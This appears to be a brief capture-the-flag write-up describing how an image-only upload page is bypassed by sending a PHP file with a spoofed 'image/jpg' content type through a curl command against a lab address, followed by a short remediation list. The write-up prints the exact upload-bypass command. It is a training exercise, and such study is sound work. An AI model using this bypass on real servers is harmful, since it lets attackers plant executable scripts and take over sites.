First, on the upload page, we detect that only jpg file is accepted.

Then we manage to send another type of file, like php script.

After many try and resources, we find out those:

https://www.lynxbee.com/how-to-upload-file-image-using-curl-command-line/

Finally, we build our curl command:
"curl -F "Upload=Upload" -F 'uploaded=@file.php;type=image/jpg' http://192.168.56.101/\?page\=upload"

Last but not least, we add
" | grep flag"
And get the flag.

# RESOLUTION

Add more checks against malicious files.
Examples:
1. Rename file
2. Check size
